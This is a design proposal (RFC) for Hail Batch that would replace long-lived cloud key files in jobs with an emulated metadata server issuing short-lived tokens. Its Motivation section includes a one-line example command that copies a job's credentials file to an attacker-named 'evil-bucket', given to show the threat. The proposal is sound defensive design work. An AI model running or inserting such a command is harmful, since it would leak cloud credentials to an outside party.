===============================================
Keyless Cloud Authentication in Hail Batch Jobs
===============================================

.. author:: Daniel Goldstein
.. date-accepted:: Leave blank. This will be filled in when the proposal is accepted.
.. ticket-url:: Leave blank. This will eventually be filled with the
                ticket URL which will track the progress of the
                implementation of the feature.
.. implemented:: Leave blank. This will be filled in with the first Hail version which
                 implements the described feature.
.. header:: This proposal is `discussed at this pull request <https://github.com/hail-is/hail-rfc/pull/0>`_.
            **After creating the pull request, edit this file again, update the
            number in the link, and delete this bold sentence.**
.. sectnum::
.. contents::
.. role::

In a Hail Batch pipeline, all user code runs under one of two identities associated
with the underlying cloud platform. On the user's computer, code runs as the user's
human identity. Inside a Batch job running in the cloud, the job is running as a
Hail-managed identity created for that user on signup. We will refer to this
identities as the user's Human Identity and the Robot Identity, respectively.

In the current system, Batch jobs are given access to the users' robot identity
through a file planted in the job's filesystem containing the identity's
credentials. In GCP, the credentials are a GSA key file. In Azure, the credentials
are a username/password for a AAD Service Principal. These credentials are created,
stored, and rotated by the Hail Batch system. 


Motivation
----------

Exposing long-lived credentials to user jobs poses a security risk,
as these credentials could be easily exfiltrated by the user or any malicious
code the user inadvertantly runs. The following is all that needs to run to
exfiltrate these credentials.

.. code-block:: python
   j.command('gcloud storage cp $GOOGLE_APPLICATION_CREDENTIALS gs://evil-bucket/')

Hail operators rotate GSA keys quarterly, so such an exfiltration could provide
a malicious actor access to all resources granted to the robot identity for up
to 90 days.

Cloud providers avoid persisting long-lived credentials on user machines through
the Metadata Server interface, an HTTP endpoint available on a
`link-local https://en.wikipedia.org/wiki/Link-local_address`_ address which can
issue access tokens for the identity assigned to the virtual machine. Available
metadata in GCP is described [here](https://cloud.google.com/compute/docs/metadata/predefined-metadata-keys). This interface has the following advantages:

- Unlike long-lived keys, these tokens are short-lived (e.g. 1 hour), reducing
  the potential attack window following exfiltration.
- The metadata server can be configured only to issue certain scopes, so the
  operations a job can perform may be restricted. It is not possible to scope
  GSA keys and AAD SP client secrets.

This proposal seeks to provide an emulated metadata server to Batch jobs and remove
jobs' dependence on long-lived credentials.

Removing this dependency also opens the door to future work of removing
long-lived credentials entirely from the system in favor of alternative approaches
to gaining access tokens from the cloud identity providers (discussed briefly 
in Inspiration & Alternatives).


Proposed Change Specification
-----------------------------

Batch jobs access credentials on the filesystem through the
``$GOOGLE_APPLICATION_CREDENTIALS``/``$AZURE_APPLICATION_CREDENTIALS``
environment variables (EVs). Under this change, the files and EVs will still be
available but their use will be deprecated in the documentation.

Currently, Batch uses firewall rules to block access to the metadata server for
user jobs, permitting users access would allow them to impersonate the batch worker.
This proposal would allow packets from jobs destined to ``169.254.169.254`` but
redirect those packets to a web server owned by the Batch Worker.
The Batch Worker can then use the
credentials for the job in question to generate access tokens on behalf of the
robot identity and distribute them upon request.

The following sequence diagrams illustrate how a Batch job obtains credentials
to access a cloud resource in the current system and under the proposed change.
The diagrams use GCP-specific terms and URLs, but the interaction is largely
the same in Azure.


Current System
==============

+-----+                                                +-----+              +-----+
| Job |                                                | IAM |              | GCS |
+-----+                                                +-----+              +-----+
   | --------------------------------------------------\  |                    |
   |-| Cook up request for access token using key file |  |                    |
   | |-------------------------------------------------|  |                    |
   |                                                      |                    |
   | https://www.googleapis.com/oauth2/v4/token           |                    |
   |----------------------------------------------------->|                    |
   |                                                      | ----------------\  |
   |                                                      |-| Validate key  |  |
   |                                                      | |---------------|  |
   |                                                      |                    |
   |                          Access Token scoped for GCS |                    |
   |<-----------------------------------------------------|                    |
   |                                                      |                    |
   | Access Token                                         |                    |
   |-------------------------------------------------------------------------->|
   |                                                      |                    | -----------------------------------\
   |                                                      |                    |-| Validate access token and scopes |
   |                                                      |                    | |----------------------------------|
   |                                                      |                    |
   |                                                      |               File |
   |<--------------------------------------------------------------------------|
   |                                                      |                    |


Proposed Model
==============

+-----+                                                                                +---------+                                              +-----+              +-----+
| Job |                                                                                | Worker  |                                              | IAM |              | GCS |
+-----+                                                                                +---------+                                              +-----+              +-----+
   |                                                                                        |                                                      |                    |
   | http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token      |                                                      |                    |
   |--------------------------------------------------------------------------------------->|                                                      |                    |
   |                                                                                        | --------------------------------------------------\  |                    |
   |                                                                                        |-| Cook up request for access token using key file |  |                    |
   |                                                                                        | |-------------------------------------------------|  |                    |
   |                                                                                        |                                                      |                    |
   |                                                                                        | https://www.googleapis.com/oauth2/v4/token           |                    |
   |                                                                                        |----------------------------------------------------->|                    |
   |                                                                                        |                                                      | ----------------\  |
   |                                                                                        |                                                      |-| Validate key  |  |
   |                                                                                        |                                                      | |---------------|  |
   |                                                                                        |                                                      |                    |
   |                                                                                        |                          Access Token scoped for GCS |                    |
   |                                                                                        |<-----------------------------------------------------|                    |
   |                                                                                        |                                                      |                    |
   |                                                                           Access Token |                                                      |                    |
   |<---------------------------------------------------------------------------------------|                                                      |                    |
   |                                                                                        |                                                      |                    |
   | Access Token                                                                           |                                                      |                    |
   |------------------------------------------------------------------------------------------------------------------------------------------------------------------->|
   |                                                                                        |                                                      |                    | -----------------------------------\
   |                                                                                        |                                                      |                    |-| Validate access token and scopes |
   |                                                                                        |                                                      |                    | |----------------------------------|
   |                                                                                        |                                                      |                    |
   |                                                                                        |                                                      |               File |
   |<-------------------------------------------------------------------------------------------------------------------------------------------------------------------|
   |                                                                                        |                                                      |                                      |


It is worth emphasizing that the purpose of this feature is *not* to provide a
fully complete and compliant metadata server to Hail Batch. Rather, the aim is to provide the
minimum functionality necessary to allow Hail libraries and popular first-party
tools like `gcloud` and `az` the ability to obtain short-lived credentials without
exposing key files to user code. As such, an implementation may implement just the
endpoints necessary to run the below examples for at least one version of `gcloud`/`az`
and all supported versions of `hail`.


Examples
--------

Under the proposed change, the following Batch job commands should succeed:

.. code-block:: python
   j.command('gcloud storage ls <MY_BUCKET>')
   j.command('hailctl batch submit <MY_SCRIPT>')


Effect and Interactions
-----------------------

This change adds a method through which jobs can obtained short-lived access
tokens without directly accessing long-lived credentials. With such a solution
in place, we can eventually remove the long-lived credentials from job containers,
mitigating the risk of exfiltration.

So long as the firewall rules are correctly configured to redirect metadata traffic
to the Batch worker, there should be no adverse interactions with the existing
system as such traffic was previously forbidden.


Inspiration & Alternatives
--------------------------

We can look to the Kubernetes project for examples of integrating with cloud
identity providers. In particular, we will examine [GKE's Workload Identity](https://cloud.google.com/kubernetes-engine/docs/concepts/workload-identity#what_is).
Workload identity allows pods to obtain credentials for GCP IAM identities. To
do so, GKE runs the [GKE Metadata Server](https://cloud.google.com/kubernetes-engine/docs/concepts/workload-identity#metadata_server)
which functions similarly to what is described in this proposal.

The difference arises in how the metadata server fulfills the user's request for
an access token. Unlike in this proposal, GKE nodes do not hold IAM credentials.
Instead, it uses OIDC to "trade" a Kubernetes Service Account credential for a
[preconfigured IAM credential](https://cloud.google.com/kubernetes-engine/docs/concepts/workload-identity#credential-flow). This has the advantage of not needing to distribute IAM
credentials in GKE and enabling fine-grained mapping between GKE and IAM identities.
However, OIDC is not easily applicable in Hail Batch because Batch is not an
identity provider. We could remove the storage and distribution of key files in GCP by
using [IAM Service Account Impersonation](https://cloud.google.com/docs/authentication/use-service-account-impersonation), but that is outside the scope of this RFC.
